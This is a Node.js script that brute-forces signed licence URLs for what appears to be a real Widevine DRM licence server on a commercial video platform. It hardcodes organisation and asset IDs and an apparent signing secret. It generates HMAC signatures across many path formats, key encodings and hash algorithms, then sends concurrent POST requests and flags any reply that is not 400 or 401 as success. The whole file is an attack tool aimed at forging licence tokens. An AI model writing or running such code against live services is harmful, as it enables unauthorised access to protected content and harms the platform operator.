const crypto = require('crypto');
const https = require('https');

const orgId1 = "64c6cbb6554ec6e3e9ec51a7";
const orgId2 = "64c6cbba47b2326c9b8f29d9";
const assetId = "64d28c927e5821954062dab2";
const signSecret = "2c3d7d427565aa2a60f451355ec8451e";
const expires = Math.round(Date.now() / 1000) + 3600;

function generatePermutations() {
  const paths = [
    `/licence/${orgId1}/${assetId}`,
    `/licence/${orgId2}/${assetId}`,
    `/${orgId1}/${assetId}`,
    `/${orgId2}/${assetId}`,
    `licence/${orgId1}/${assetId}`,
    `${orgId1}/${assetId}`
  ];

  let payloads = [];
  for (let p of paths) {
    payloads.push(`${p}${expires}`);
    payloads.push(`${p}?expires=${expires}`);
    payloads.push(p);
  }

  const signSecretB64 = Buffer.from(signSecret, 'base64');
  const signSecretHex = Buffer.from(signSecret, 'hex');
  const signSecretUtf8 = signSecret;
  
  const keys = [signSecretB64, signSecretHex, signSecretUtf8];
  const algos = ['sha1', 'sha256', 'md5'];
  const outputs = ['hex', 'base64'];

  let urls = [];
  
  for (let payload of payloads) {
    for (let key of keys) {
      for (let algo of algos) {
        for (let out of outputs) {
          try {
            const signature = crypto.createHmac(algo, key).update(payload).digest(out);
            urls.push(`https://widevine.gumlet.com/licence/${orgId1}/${assetId}?token=${encodeURIComponent(signature)}&expires=${expires}`);
          } catch(e) {}
        }
      }
    }
  }
  return urls;
}

const allUrls = generatePermutations();
console.log(`Total permutations to test: ${allUrls.length}`);

function testUrl(url, index) {
  return new Promise((resolve) => {
    const req = https.request(url, { method: 'POST' }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        if (res.statusCode !== 400 && res.statusCode !== 401) {
           console.log(`!!! SUCCESS !!! Response ${index+1}: ${res.statusCode} - ${data} for URL: ${url}`);
        }
        resolve();
      });
    });
    req.on('error', (e) => {
      resolve();
    });
    req.write('dummy_challenge');
    req.end();
  });
}

// concurrency to test faster
async function test() {
  const concurrency = 20;
  for (let i = 0; i < allUrls.length; i += concurrency) {
    const chunk = allUrls.slice(i, i + concurrency);
    await Promise.all(chunk.map((url, idx) => testUrl(url, i + idx)));
  }
  console.log("Done testing all permutations!");
}

test();
